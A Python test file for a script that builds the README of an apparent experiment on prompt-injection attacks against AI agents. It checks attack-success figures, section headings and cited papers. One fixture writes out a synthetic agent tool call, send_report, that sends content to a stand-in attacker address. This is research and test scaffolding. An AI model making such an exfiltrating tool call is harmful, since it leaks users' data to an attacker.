"""Tests for scripts/make_readme.py on synthetic runs (no API calls)."""

import json
import re
import sys
from pathlib import Path

from src import analyze
from src.config import load_config
from src.run_experiment import plan_runs
from tests.test_analyze import make_row

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))
import make_readme  # noqa: E402


def readme_for(tmp_path, rows):
    cfg = load_config()
    (tmp_path / "raw_runs.jsonl").write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")
    res = analyze.analyze(tmp_path, cfg, verbose=False)
    return make_readme.build(cfg, make_readme.read_csv(tmp_path / "summary.csv"),
                             make_readme.read_csv(tmp_path / "breakdown.csv"),
                             json.loads((tmp_path / "failure_examples.json").read_text(encoding="utf-8")),
                             res["progress"], res["n_done"], res["n_planned"])


def test_partial_readme_says_in_progress_and_has_no_placeholders(tmp_path):
    plan = plan_runs(load_config())
    specs = [s for s in plan if s["block"] == "clean"] + [s for s in plan if s["block"] == "D0"][:50]
    rows = [make_row(s, exposed=True, attempted=i % 5 == 0, attack_success=i % 5 == 0,
                     tool_calls=[{"name": "send_report", "args": {"recipient": "attacker@exfil-mail.example",
                                                                   "content": "x"}}] if i % 5 == 0 else [])
            for i, s in enumerate(specs)]
    text = readme_for(tmp_path, rows)
    assert "Experiment in progress:** 110 of 660" in text
    assert "in progress (50/200)" in text and "not started (0/200)" in text
    assert "20.0% (10/50)" in text                                   # D0 ASR from the data
    assert "**1. " in text and "attacker@exfil-mail.example" in text  # failure examples present
    assert not re.search(r"\bTBD\b|\bTODO\b|XX\.X|\?\?%|lorem", text, re.I)
    for section in ("## 1. Question", "```mermaid", "## 3. Attacks", "## 4. Results", "## 5. Failure",
                    "## 6. Limitations", "## 7. Data", "## 8. Related work", "## 9. How to reproduce"):
        assert section in text
    assert "reasoning_effort: none" in text and "Qwen" in text
    assert "Contains modified Copernicus Sentinel data 2025" in text and "Open-Meteo" in text
    assert "2302.12173" in text and "2406.13352" in text and "2508.16481" in text
    assert "Flooded paddy" in text                                   # pulled from notes/limitations_draft.md


def test_complete_readme_has_no_in_progress(tmp_path):
    rows = [make_row(s) for s in plan_runs(load_config())]
    text = readme_for(tmp_path, rows)
    assert "in progress" not in text.lower() and "not started" not in text
    assert "No executed attacks yet." in text
